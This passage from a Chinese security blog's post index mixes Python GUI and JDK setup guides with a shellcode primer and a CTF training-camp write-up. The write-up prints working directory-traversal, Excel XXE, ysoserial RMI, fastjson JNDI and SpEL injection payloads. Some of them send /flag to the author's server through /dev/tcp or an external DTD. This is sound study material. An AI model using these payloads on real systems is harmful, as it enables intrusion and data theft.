12BASE:&quot;GHI45FQRSCX****UVWJK67DELMNOPAB3&quot; 仔细观察了一下，空缺的4个字符很明显需要爆破，不过发现没有字符重复，末尾没有等号，应该不是一段需要爆破的base32码，而是一段base32的私有表 爆破+变表解码 12345678910111213141516171819import base64import stringbase32 = &quot;TCMDIEOH2MJFBLKHT2J7BLYZ2WUE5NYR2HNG====&quot;string1 = &quot;GHI45FQRSCX&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;UVWJK67DELMNOPAB3&quot;string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&quot;t = &#x27;2TYZ&#x27;for i in t: for j in t: for k in t: for l in t: if i != j != k != l : str = string1.format(i,j,k,l) try: print(base64.b32decode(base32.translate(string.maketrans(str,string2))).decode()) except: pass 从输出中选一个正常的flag即可","categories":[{"name":"CTF","slug":"CTF","permalink":"https://vvmdx.github.io/categories/CTF/"}],"tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://vvmdx.github.io/tags/WriteUp/"}]},{"title":"Pycharm+PyQT5/Pyside2开发python图形界面","slug":"2021-09-19-Pycharm+PyQT5Pyside2开发python图形界面","date":"2021-09-18T16:00:00.000Z","updated":"2021-09-19T05:42:59.731Z","comments":true,"path":"2021/09/19/2021-09-19-Pycharm+PyQT5Pyside2开发python图形界面/","link":"","permalink":"https://vvmdx.github.io/2021/09/19/2021-09-19-Pycharm+PyQT5Pyside2%E5%BC%80%E5%8F%91python%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2/","excerpt":"","text":"Pycharm+PyQT5/Pyside2开发python图形界面 os：win10 环境：python3.9 工具：pycharm2021 图形化界面库：pyside2或pyqt5 区别： pyside2是python官方库，2018年才有的，目前文档不是特别多 pyqt5比较成熟，出现的早，文档比较详细，pyqt5不可闭源商用（必须开源） 相同点： 代码几乎一样，甚至包几乎都是一样的，从pyqt5到pyside2几乎没有学习成本 安装库 pyqt5 pip3 install PyQt5 -i https://pypi.douban.com/simple pip3 install PyQt5-tools -i https://pypi.douban.com/simple pyside2 pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple pyside2 QtDesigner配置 使用QtDesigner快速制作图形化界面 File &gt;&gt; Settings &gt;&gt; Tools &gt;&gt; External Tools &gt;&gt; + Name：随便填 Program：designer.exe路径（直接everything搜索designer.exe就可以了） PyQT5一般为../site-packages/pyqt5_tools/designer.exe或者../site-packages/qt5_applications/Qt/bin/designer.exe Pyside2为../site-packages/PySide2/designer.exe Working directory：$FileDir$ PyUic配置 把Qt的.ui文件转为.py文件 继续在External Tools里添加 第一种配置方法 Program：python3.exe地址 Arguments：-m PyQt5.uic.pyuic $FileName$ -o $FileNameWithoutExtension$.py Working directory：$FileDir$ 第二种配置方法 Program：D:\\DevelopTools\\Python-3.9.5\\Scripts\\pyuic5.exe Arguments：$FileName$ -o $FileNameWithoutExtension$.py Working directory：$FileDir$ 挑一种配就好了，都一样 PyRcc配置 将资源文件转码 配置和pyuic差不多 Program：D:\\DevelopTools\\Python-3.9.5\\Scripts\\pyrcc5.exe Arguments：$FileName$ -o $FileNameWithoutExtension$_rc.py Working directory：$FileDir$ QtDesigner使用 到这里就全部配置完成了 在Tool中点击即可打开QtDesigner界面 设计完成后保存为.ui文件，回到pycharm就可以看到了 将.ui文件转为.py文件：右键test.ui &gt;&gt; External Tools &gt;&gt; PyUic 点击后即生成对应的test.py文件 Python中打开窗口 静态加载 即先转为.py文件，再使用该文件打开窗口 代码如下 1234567891011import sysfrom PyQt5.QtWidgets import QApplication, QMainWindowimport first # module first.pyif __name__ == &#x27;__main__&#x27;: app = QApplication(sys.argv) myMainWindow = QMainWindow() myUi = first.Ui_MainWindow() myUi.setupUi(myMainWindow) myMainWindow.show() sys.exit(app.exec_()) 动态加载 无需转为.py文件，直接导入.ui文件 优点：在QtDesigner设计修改后保存的.ui文件可以直接动态加载出来，不用再转为.py文件 代码如下： 12345678910111213141516171819from PySide2.QtCore import QFilefrom PySide2.QtWidgets import QApplicationfrom PySide2.QtUiTools import QUiLoaderclass Test: def __init__(self): # 从文件中加载UI定义 qfile = QFile(&quot;ui/test.ui&quot;) qfile.open(QFile.ReadOnly) qfile.close() # 从 UI 定义中动态 创建一个相应的窗口对象 self.ui = QUiLoader().load(qfile)app = QApplication([])test = Test()test.ui.show()app.exec_()","categories":[{"name":"系统&工具&环境配置","slug":"系统-工具-环境配置","permalink":"https://vvmdx.github.io/categories/%E7%B3%BB%E7%BB%9F-%E5%B7%A5%E5%85%B7-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"}],"tags":[{"name":"环境&工具","slug":"环境-工具","permalink":"https://vvmdx.github.io/tags/%E7%8E%AF%E5%A2%83-%E5%B7%A5%E5%85%B7/"}]},{"title":"山石安研第一届CTF训练营","slug":"2021-08-31-山石安研第一届CTF训练营","date":"2021-08-30T16:00:00.000Z","updated":"2021-11-20T02:15:45.262Z","comments":true,"path":"2021/08/31/2021-08-31-山石安研第一届CTF训练营/","link":"","permalink":"https://vvmdx.github.io/2021/08/31/2021-08-31-%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8ACTF%E8%AE%AD%E7%BB%83%E8%90%A5/","excerpt":"","text":"山石安研第一届CTF训练营 过去一周参加了山石安研的ctf训练营，做了几道题感觉还是颇有意义，虽然不难，但是算是某些类型的典型题吧，靶机可能访问不到了，不过关键还是在于记录下一些思路和分析过程吧 这些题目分别涉及目录穿越、Excel XXE、反序列化、RMI、fastjson 1.2.47 RCE、shiro反序列化CVE-2016-4437、spel注入等知识点 最后一道后来发现是p神的一道题，javacon的表达式沙盒绕过 https://github.com/phith0n/code-breaking/tree/master/2018/javacon 最近发现博客访问人数突然多了，，本来只想自己记录下学习过程，现在意外的发现还有分享的作用，顺便放几道代审题的附件吧 链接：https://pan.baidu.com/s/1I4z7-jBcOUyt1d4lDR-8zQ 提取码：2333 作业一wp 知识点：任意文件下载、目录穿越、代码审计、Excel XXE 地址：http://58.240.236.228:32013/ 进去后是一个上传文件的地方，一开始还以为是上传个一句话木马的php，但是上传后发现他并不会解析成可访问路径，不过在下载文件的接口发现需要传一个filename，尝试更改一些其他的文件名，发现当文件名含有flag时会返回禁止读取，当传空参时回显500，爆出疑似项目路径 尝试目录穿越访问该web项目的配置文件 12# payloadhttp://58.240.236.228:32013/file_in_java/DownloadServlet?filename=../../../../../../../../../usr/local/tomcat/webapps/file_in_java/WEB-INF/web.xml 获取到项目源码的包名后，直接通过这个接口下载三个class文件 12# payloadhttp://58.240.236.228:32013/file_in_java/DownloadServlet?filename=../../../../../../../../../usr/local/tomcat/webapps/file_in_java/WEB-INF/classes/cn/abc/servlet/DownloadServlet.class 放入jd-gui反编译，重点关注UploadServlet，可以看到在红色框标识处的条件判断，当文件名以“excel-”开头且为“xlsx”后缀的文件时会使用POI解析这个excel文档，因此考虑excel xxe 首先新建一个.xlsx格式的excel文档，修改后缀名为.zip，然后解压，在[Content_Types].xml中插入一段xml，作用是从远程服务器获取evil.dtd文件，其中%all;%send;是定义在evil.dtd中的，evil.dtd作用是读取根目录下的flag文件并发送到远程服务器的9000端口 [Content_Types].xml插入部分 1234&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://1.14.169.109:8000/evil.dtd&quot;&gt;%remote;%all;%send;]&gt; evil.dtd 12&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://1.14.169.109:9000?file=%file;&#x27;&gt;&quot;&gt; 改完xml后将文件夹重新压缩回zip，然后文件名改为excel-.xlsx以满足条件判断让服务器解析该文档 evil.dtd文件则上传到vps（我用的是腾讯云） 123scp 本地文件地址 vps账号@vps公网ip:服务器文件地址scp /mnt/hgfs/Kali_share/evil.dtd root@x.x.x.x:/root/evil.dtd然后输入vps密码就可以了 接着登录vps，进入evil.dtd所在的文件夹，用python开启一个web服务 123# python2 3使用方法不一样，但是效果一样python2 -m SimpleHTTPServerpython3 -m http.server 这个服务默认开启在8000端口，访问[ip:port]即可看到目录下的evil.dtd 接着根据我们写的evil.dtd，会将读取到的flag发送到9000端口，因此用nc监听该端口 1nc -lvvp 9000 然后上传文件即可发现服务器从我们的vps下载了evil.dtd，且将数据发送到了9000端口 作业二wp 知识点：代码审计、反序列化 直接idea打开项目，源码很少，只有一个类，直接看关键方法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849public class Hello &#123; ..... @PostMapping(&quot;/attack&quot;) @ResponseBody public String attack(HttpServletRequest req)&#123; try&#123; String strstr = &quot;iwantflag&quot;; // 从request读取数据流 BufferedReader br = new BufferedReader(new InputStreamReader(req.getInputStream())); StringBuffer sb=new StringBuffer(); String s; // 将数据流写到Stringbuffer里 while((s=br.readLine())!=null)&#123; sb.append(s); &#125; // Base64解密数据流 byte[] bytes = (new BASE64Decoder()).decodeBuffer(sb.toString()); // 将字节数组转化为输入流 ByteArrayInputStream bais = new ByteArrayInputStream(bytes); // 将输入流反序列化为HashMap对象 ObjectInputStream ois = new ObjectInputStream(bais); HashMap obj = (HashMap) ois.readObject(); // 读取HashMap对象中的键值对 Set&lt;Object&gt; objset = obj.keySet(); Iterator it = objset.iterator(); while(it.hasNext())&#123; Object key = it.next(); // 当key为URL类的一个实例对象时通过条件判断 if(key.getClass() == URL.class)&#123; // 获取URL实例对象key的host属性的值 String url = ((URL)key).getHost(); // 若该值包含strstr=&quot;iwantflag&quot;则读取flag if(url.contains(strstr))&#123; return getFlag(); &#125; &#125; &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; return &quot;zai try try:(&quot;; &#125; ....&#125; 分析完流程就很好做了，读取flag的正向流程如下 123456读取数据流 -&gt;Base64解密 -&gt;反序列化为HashMap对象 -&gt;HashMap对象的键为URL类的一个对象 -&gt;该对象的host属性的值包含&quot;iwantflag&quot;字符串 -&gt;读取flag 接下来我们只要逆向构造出一个满足条件的HashMap对象，并将其序列化后base64解密即可 12345678910111213141516171819202122232425262728public static void test() throws IOException &#123; String strstr = &quot;iwantflag&quot;; HashMap hashMap = new HashMap(); // URL类的构造方法需要4个参数，其中第二个参数即为host，也就是getHost()方法获取到的参数，其他几个随便写就行 URL urlObj = new URL(&quot;http&quot;,&quot;iwantflag&quot;,9000,&quot;&quot;); // 设置key-value对，关键是key必须为URL类的对象，value无所谓，用不到 hashMap.put(urlObj,&quot;&quot;); Set&lt;Object&gt; objectSet = hashMap.keySet(); Iterator iterator = objectSet.iterator(); while (iterator.hasNext()) &#123; Object key = iterator.next(); if(key.getClass() == URL.class)&#123; String url = ((URL)key).getHost(); if(url.contains(strstr))&#123; // 以上几行都是为了模拟正向读取flag进行的判断，实际上对流程没影响 ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(baos); // 将HashMap序列化后写入流 outputStream.writeObject(hashMap); outputStream.close(); // 将流的字节数组base64加密 String encodeStr = new BASE64Encoder().encode(baos.toByteArray()); // 打印结果 System.out.println(encodeStr); &#125; &#125; &#125;&#125; 打印出来的结果直接丢到burp里面发送即可获取flag 作业三wp 知识点：jmeter反序列化rce、CVE-2018-1297 地址：58.240.236.228:31099（是个rmi服务） 既然都是rmi了，题目又有jmeter，直接拿去搜，找到一个Jmeter RMI的反序列化漏洞CVE-2018-1297，而且ysoserial也集成了exp，直接使用，然后执行读取flag的命令重定向发送到我们自己的vps，然后自己在vps上监听端口即可 1java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 58.240.236.228 31099 BeanShell1 &#x27;bash -c &#123;echo,Y2F0IC9mbGFnID4mIC9kZXYvdGNwLzEuMTQuMTY5LjEwOS85MDAwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27; 参考：https://vulhub.org/#/environments/jmeter/CVE-2018-1297/ 关于[cmd]部分为何长这样：因为当调用Runtime.getRuntime().exec()时，会因为重定向符号“&gt;”被错误解释，因此当我们的cmd需要使用重定向符时需要经过Base64编码和bash的重新编排 原cmd： 1cat /flag &gt;&amp; /dev/tcp/ip/9000 0&gt;&amp;1 转换后： 工具地址：http://www.jackson-t.ca/runtime-exec-payloads.html 作业四wp 知识点：fastjson 1.2.47 RCE 地址：58.240.236.228:38833 访问后返回一个json格式化的数据 抓包，修改GET为POST，添加头部Content-Type: application/json，发送一段不完整的json探测一下，确定是fastjson dnslog探测一下，没问题 首先编写Exploit.java，目的是让目标服务器通过rmi加载然后执行 执行的命令为cat /flag &gt;&amp; /dev/tcp/1ip/9000 0&gt;&amp;1经过base64和shell编码编排后的结果 1234567891011import java.io.IOException;import java.lang.Runtime;public class Exploit &#123; static &#123; try &#123; Runtime.getRuntime().exec(&quot;bash -c &#123;echo,Y2F0IC9mbGFnID4mIC9kZXYvdGNwLzEuMTQuMTY5LjEwOS85MDAwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;); &#125; catch (IOException ignored) &#123; &#125; &#125;&#125; 准备工具 官方项目https://github.com/mbechler/marshalsec，可以自己打包为jar 打包好的：https://github.com/CaijiOrz/fastjson-1.2.47-RCE，还带有教程 将jar包和Exploit一起上传到vps 在目录下开启web服务 python3 -m http.server 监听9000端口 nc -lvvp 9000 开启rmi服务 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://ip:8000/#Exploit&quot; 9999 发送payload到服务器即可 1&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://ip:9999/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125; ShiroSpel 知识点：代码审计、表达式注入、黑名单过滤绕过、CVE-2016-4437 地址：58.240.236.228:33014 反编译后直接看MainController 关注以下两个关键方法 首先是登录页面，代码如下 123456789101112131415@PostMapping(&#123;&quot;/login&quot;&#125;)public String login(@RequestParam(value = &quot;username&quot;,required = true) String username, @RequestParam(value = &quot;password&quot;,required = true) String password, @RequestParam(value = &quot;remember-me&quot;,required = false) String isRemember, HttpSession session, HttpServletResponse response) &#123; if (this.userConfig.getUsername().contentEquals(username) &amp;&amp; this.userConfig.getPassword().contentEquals(password)) &#123; session.setAttribute(&quot;username&quot;, username); if (isRemember != null &amp;&amp; !isRemember.equals(&quot;&quot;)) &#123; Cookie c = new Cookie(&quot;remember-me&quot;, this.userConfig.encryptRememberMe()); c.setMaxAge(2592000); response.addCookie(c); &#125; return &quot;redirect:/&quot;; &#125; else &#123; return &quot;redirect:/login-error&quot;; &#125;&#125; 接受三个参数，其中username和password均为admin（写在application.yml里面） remember-me为可选参数，当不为空时，调用加密函方法，并设置为Cookie值，加密方法如下 12345678910111213141516171819// UserConfigpublic String encryptRememberMe() &#123; String encryptd = Encryptor.encrypt(this.rememberMeKey, &quot;0123456789abcdef&quot;, this.username); return encryptd;&#125;//Encryptorpublic static String encrypt(String key, String initVector, String value) &#123; try &#123; IvParameterSpec iv = new IvParameterSpec(initVector.getBytes(&quot;UTF-8&quot;)); SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes(&quot;UTF-8&quot;), &quot;AES&quot;); Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;); cipher.init(1, skeySpec, iv); byte[] encrypted = cipher.doFinal(value.getBytes()); return Base64.getUrlEncoder().encodeToString(encrypted); &#125; catch (Exception var7) &#123; logger.warn(var7.getMessage()); return null; &#125;&#125; 容易看出用了aes加密，其中初始向量iv=0123456789abcdef，密钥rememberMeKey=c0dehack1nghere1（同样写在application.yml里 以上是登录的流程的分析，若登录成功，则会跳转到根页面hello，以下是关键代码分析 1234567891011121314151617@GetMappingpublic String admin(@CookieValue(value = &quot;remember-me&quot;,required = false) String rememberMeValue, HttpSession session, Model model) &#123; if (rememberMeValue != null &amp;&amp; !rememberMeValue.equals(&quot;&quot;)) &#123; String username = this.userConfig.decryptRememberMe(rememberMeValue); if (username != null) &#123; session.setAttribute(&quot;username&quot;, username); &#125; &#125; Object username = session.getAttribute(&quot;username&quot;); if (username != null &amp;&amp; !username.toString().equals(&quot;&quot;)) &#123; model.addAttribute(&quot;name&quot;, this.getAdvanceValue(username.toString())); return &quot;hello&quot;; &#125; else &#123; return &quot;redirect:/login&quot;; &#125;&#125; 接受一个可选参数remember-me，若非空，则调用解密函数，将解密结果赋值给username，持久化后返回hello页面，在hello页面返回前还执行了model.addAttribute(&quot;name&quot;, this.getAdvanceValue(username.toString()));，这个方法大概作用就是： 将username进行黑名单过滤，黑名单就一个Runtime.getRuntime().exec() 解析SpEL表达式 解析结果返回hello页面 123456789101112131415161718// 为了阅读方便，我将var2、3、4等变量改为其实际意义以便阅读private String getAdvanceValue(String username) &#123; String[] blackList = this.keyworkProperties.getBlacklist(); int blackList_length = blackList.length; for(int i = 0; i &lt; blackList_length; ++i) &#123; String keyword = backList[i]; Matcher matcher = Pattern.compile(keyword, 34).matcher(username); if (matcher.find()) &#123; throw new HttpClientErrorException(HttpStatus.FORBIDDEN); &#125; &#125; ParserContext parserContext = new TemplateParserContext(); Expression exp = this.parser.parseExpression(username, parserContext); SmallEvaluationContext evaluationContext = new SmallEvaluationContext(); return exp.getValue(evaluationContext).toString();&#125; 到这里整个程序的关键部分基本已经分析完了，思路也容易想到： 首先先登录系统 接着使用aes的密钥和初始向量加密一段payload，作为cookie里的remember-me的值发送 服务器将解密结果赋值给username，经过黑名单过滤后交给SpEl表达式解析 我们的目的就是让表达式解析我们的恶意payload而造成rce 先测试一下我们的思路对不对，首先用源码的加密方式加密字符串2*2，然后把密文当作cookie的remember-me发送 结果我惊了，好消息是加密方式没错，确实能将username设置为我们想要的内容，坏消息是他压根没被解析出来，按理来说应该得是4才对，经过调试后发现，在ParserContext parserContext = new TemplateParserContext();定义了表达式的模板（或者说是格式），其中TemplateParserContext类规定了表达式的形式是#&#123;Expression Language&#125;的形式，这就好办了，我们把#&#123;2*2&#125;加密一下重新尝试 居然还是不行…但是我自己写了个类又是没问题的，后来重新看代码的时候才发现，，后端设值语句为model.addAttribute(&quot;name&quot;, this.getAdvanceValue(username.toString()));，而前端取值语句为&lt;h2 th:text=&quot;'Hello, ' + $&#123;session.username&#125;&quot;&gt;&lt;/h2&gt;，完全不对应，，，等于说后端其实是执行了的，只是没有把执行结果返回前端而已（一时竟不知这是出题人失误还是故意的） 现在只剩下最后过个黑名单了，这个也十分简单，用反射+字符串拆分就行，编写payload如下 1String value = &quot;#&#123;T(String).getClass().forName(&#x27;java.la&#x27;+&#x27;ng.Ru&#x27;+&#x27;ntime&#x27;).getMethod(&#x27;ex&#x27;+&#x27;ec&#x27;, T(String[])).invoke(T(String).getClass().forName(&#x27;java.la&#x27;+&#x27;ng.Ru&#x27;+&#x27;ntime&#x27;).getMethod(&#x27;getRun&#x27;+&#x27;time&#x27;).invoke(T(String).getClass().forName(&#x27;java.la&#x27;+&#x27;ng.Ru&#x27;+&#x27;ntime&#x27;)), new String[]&#123;&#x27;calc.exe&#x27;&#125;)&#125;&quot;; 对payload进行加密后，本地起项目尝试发送，成功弹窗，说明已经完成rce，最后就是读取flag了 最后将执行的命令改为读取flag并带出，payload如下 1String value = &quot;#&#123;T(String).getClass().forName(&#x27;java.la&#x27;+&#x27;ng.Ru&#x27;+&#x27;ntime&#x27;).getMethod(&#x27;ex&#x27;+&#x27;ec&#x27;, T(String[])).invoke(T(String).getClass().forName(&#x27;java.la&#x27;+&#x27;ng.Ru&#x27;+&#x27;ntime&#x27;).getMethod(&#x27;getRun&#x27;+&#x27;time&#x27;).invoke(T(String).getClass().forName(&#x27;java.la&#x27;+&#x27;ng.Ru&#x27;+&#x27;ntime&#x27;)), new String[]&#123;&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;&#123;echo,Y2F0IC9mbGFnID4mIC9kZXYvdGNwLzEuMTQuMTY5LjEwOS85MDAwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&#125;)&#125;&quot;; 监听端口，成功获取flag 最后想了一下，这道题虽然没用shiro但是还是叫这个名的意思大概是因为在spel表达式注入之前的漏洞利用的是shiro的CVE-2016-4437？就也是因为AES硬编码、使用默认密钥导致的，通过cookie的rememberMe参数注入的漏洞","categories":[{"name":"CTF","slug":"CTF","permalink":"https://vvmdx.github.io/categories/CTF/"}],"tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://vvmdx.github.io/tags/WriteUp/"}]},{"title":"Kali2021安装多版本jdk及切换","slug":"2021-08-28-Kali2021安装多版本jdk及切换","date":"2021-08-27T16:00:00.000Z","updated":"2021-09-19T05:24:40.474Z","comments":true,"path":"2021/08/28/2021-08-28-Kali2021安装多版本jdk及切换/","link":"","permalink":"https://vvmdx.github.io/2021/08/28/2021-08-28-Kali2021%E5%AE%89%E8%A3%85%E5%A4%9A%E7%89%88%E6%9C%ACjdk%E5%8F%8A%E5%88%87%E6%8D%A2/","excerpt":"","text":"Kali2021安装多版本jdk及切换 这几天做题的时候要复现个漏洞环境，其中有个步骤是用java跑开启rmi的jar包，没想到因为java版本太高而出现警告 查看java版本 1java -version Kali2021预装了一个jdk11 查看系统内有多少个java环境 1update-alternatives --config java 目前应该只有一个/usr/lib/jvm/java-11-openjdk-amd64/bin/java 若有其他的有可能是因为安装的其他工具顺带有java环境 切换java环境 若没有，则官网下载，找jdk-8u301-linux-x64.tar.gz这个 下载完自己创个文件夹放进去，我是放在根目录下的packages文件夹 进入文件夹解压 1root@kali2021:/packages# tar -zxvf jdk-8u301-linux-x64.tar.gz 配置环境变量 123export JAVA_HOME=/packages/jdk1.8.0_301export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarexport PATH=$PATH:$JAVA_HOME/bin 设置序列号 1update-alternatives --install /usr/bin/java java /packages/jdk1.8.0_301/bin/java 3 回到步骤2，查看有多少个java环境，然后步骤3切换，再输入java -version时发现已经切换为jdk1.8了","categories":[{"name":"系统&工具&环境配置","slug":"系统-工具-环境配置","permalink":"https://vvmdx.github.io/categories/%E7%B3%BB%E7%BB%9F-%E5%B7%A5%E5%85%B7-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"}],"tags":[{"name":"环境&工具","slug":"环境-工具","permalink":"https://vvmdx.github.io/tags/%E7%8E%AF%E5%A2%83-%E5%B7%A5%E5%85%B7/"}]},{"title":"Shellcode基础","slug":"2021-08-16-Shellcode基础","date":"2021-08-15T16:00:00.000Z","updated":"2021-08-31T10:47:11.806Z","comments":true,"path":"2021/08/16/2021-08-16-Shellcode基础/","link":"","permalink":"https://vvmdx.github.io/2021/08/16/2021-08-16-Shellcode%E5%9F%BA%E7%A1%80/","excerpt":"","text":"Shellcode基础 基本原理 shellcode通常是一小段用于利用软件漏洞的机器代码，目的是为了获得目标机器的shell 本地shellcode常用于提权，攻击者利用高权限程序中的漏洞获得与目标进程相同的权限 远程shellcode通过TCP/IP套接字为攻击者提供shell访问（反弹shell、绑定shell、套接字重用shell） shellcode可分段执行，由一段短的shellcode去加载一段复杂的shellcode 编写 C语言 C编写简单shellcode 1234567# include &quot;stdlib.h&quot;# include &quot;unistd.h&quot;int main() &#123; system(&quot;/bin/sh&quot;); exit(0);&#125; 执行效果如下，可以看到已经拿到shell C语言使用内联汇编方式调用shellcode，使用的shellcode为汇编生成的opcode（先看汇编那一节） 12345678910111213141516171819202122#include &quot;stdio.h&quot;#include &lt;string.h&gt;char shellcode[] = &quot;\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80&quot;;int main() &#123; printf(&quot;Shellcode length: %d bytes\\n&quot;, strlen(shellcode)); (*(void(*)()) shellcode)();/* __asm__(&quot;movl $0xffffffff, %eax\\n\\t&quot; &quot;movl %eax, %ebx\\n\\t&quot; &quot;movl %eax, %ecx\\n\\t&quot; &quot;movl %eax, %edx\\n\\t&quot; &quot;movl %eax, %esi\\n\\t&quot; &quot;movl %eax, %edi\\n\\t&quot; &quot;movl %eax, %ebp\\n\\t&quot; &quot;call shellcode&quot;);*/ return 0;&#125; 12# -z execstack用于禁用NX保护机制gcc -m32 -z execstack shellcode.c -o shellcode 汇编 21个字节实现execve(&quot;/bin/sh&quot;)的Linux 32位程序（2种都可以） 123456789101112; shell1global_startsection .text_start: push 0x68732f ; &quot;/sh&quot; push 0x6e69622f ; &quot;/bin&quot; mov ebx, esp ; ebx=&quot;/bin/sh&quot; xor ecx, ecx ; ecx=0 xor edx, edx ; edx=0 mov eax, 0xb ; system_number int 0x80 ; 软中断 12345678910111213;shell2global_startsection .text_start: xor ecx, ecx ; ecx=0 mul ecx ; eax=0 edx=0 mov al, 11 ; execve syscall number push ecx push 0x68732f2f ; &quot;//sh&quot; push 0x6e69622f ; &quot;/bin&quot; mov ebx, esp ; pointer int 0x80 push的理解 /bin/sh用16进制表示为2f62696e2f7368 由于是小端序，因此/sh=0x68 0x73 0x2f，由于不足4个字节，用'/' (0x2f)补足即&quot;//sh&quot; = 0x68732f2f 同理，&quot;/bin&quot; = 0x6e69622f 压栈顺序：h &gt;&gt; s &gt;&gt; / &gt;&gt; / &gt;&gt; n &gt;&gt; i &gt;&gt; b &gt;&gt; / xor的理解 shellcode中不能包含NULL，因为NULL会将字符串操作函数阶段，这样执行的shellcode就会被截断 xor ecx, ecx用于替换mov ecx, 0x00 寄存器的理解 mov ebx, esp：将栈顶指针赋给ebx mov eax, 0xb：0xb = 11，execve的系统调用号为11 xor ecx(edx), ecx(edx)：清空ecx和edx寄存器 软中断 由于一般shellcode有长度限制而且我们不知道系统函数地址，无法直接调用 触发中断（int 0x80或者syscall）进行系统调用 system(&quot;/bin/sh&quot;)底层是调用execve(&quot;/bin/sh&quot;,0,0) 12345678# 编译nasm -f elf32 shell.asm# 使用ld进行链接获得shellld -m elf_i386 shell.o -o shell# 执行shell已经可以拿到shell./shell# 查看shell的操作码objdump -d shell 因此shellcode为&quot;\\x68\\x2f\\x73\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb8\\x0b\\x00\\x00\\x00\\xcd\\x80&quot; shell2的shellcode为&quot;\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80&quot; gdb详细信息如下 Linux 64位 shellcode30字节 1234567891011121314global _startsection .text_start: xor rdx, rdx mov qword rbx, &#x27;//bin/sh&#x27; shr rbx, 0x8 push rbx mov rdi, rsp push rax push rdi mov rsi, rsp mov al, 0x3b syscall 编译并链接 123# 注意现在是64位了nasm -f elf64 shell_64bit.asm ld -m elf_x86_64 shell_64bit.o -o shell_64bit python 使用pwntools生成shellcode 123from pwn import *context(log_level=&#x27;debug&#x27;, arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)shellcode=asm(shellcraft.sh())","categories":[{"name":"PWN","slug":"PWN","permalink":"https://vvmdx.github.io/categories/PWN/"}],"tags":[{"name":"教学&思路&过程","slug":"教学-思路-过程","permalink":"https://vvmdx.github.io/tags/%E6%95%99%E5%AD%A6-%E6%80%9D%E8%B7%AF-%E8%BF%87%E7%A8%8B/"}]},{"title":"java反序列化基础","slug":"2021-08-13-java反序列化基础","date":"2021-08-12T16:00:00.000Z","updated":"2021-08-13T02:57:16.949Z","comments":true,"path":"2021/08/13/2021-08-13-java反序列化基础/","link":"","permalink":"https://vvmdx.github.io/2021/08/13/2021-08-13-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/","excerpt":"","text":"java反序列化基础 序列化：将对象转化为字节流以便传递 反序列化：序列化逆过程，字节流转化为对象 漏洞成因：反序列化类中有执行系统命令的代码，而没有对序列化字节流进行检测 工具：ysoserial 序列化与反序列化 实体类实现java.io.Serializable接口 serialVersionId用于标识序列化类的版本，防止类名相同导致反序列化错误 静态属性（static）、transient修饰的属性不参与序列化过程 12345678910111213141516171819202122232425// 实体类public class User implements Serializable &#123; public static final long serialVersionUID = 1L; public String name; public int id; public String sex; public User() &#123; this(&quot;alice&quot;,123, &quot;female&quot;); &#125; public User(String name, int id, String sex) &#123; this.name = name; this.id = id; this.sex = sex; &#125; private void writeObject(ObjectOutputStream s) throws IOException &#123; s.defaultWriteObject(); &#125; private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException &#123; s.defaultReadObject(); &#125;&#125; 序列化通过ObjectOutputStream.writeObject(Object)实现 反序列化通过ObjectInputStream.readObject(Object)实现 java在序列化和反序列化时，若实体类实现了Serializable接口，则会调用其中的writeObject和readObject方法 123456789101112131415161718192021222324// Serialize是自己编写的接口public interface Serialize &#123; void output(Object obj,String file) throws IOException; void input(String file) throws IOException, ClassNotFoundException;&#125;// SerializeImpl实现了自己写的接口public class SerializeImpl implements Serialize &#123; public void output(Object obj, String file) throws IOException &#123; ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(file)); outputStream.writeObject(obj); outputStream.close(); &#125; public void input(String file) throws IOException, ClassNotFoundException &#123; ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(file)); Object outUser = inputStream.readObject(); inputStream.close(); System.out.println(outUser); &#125;&#125; 序列化文件 serialVersionUID详解 Java序列化机制通过判断类的serialVersionId来验证版本是否一致 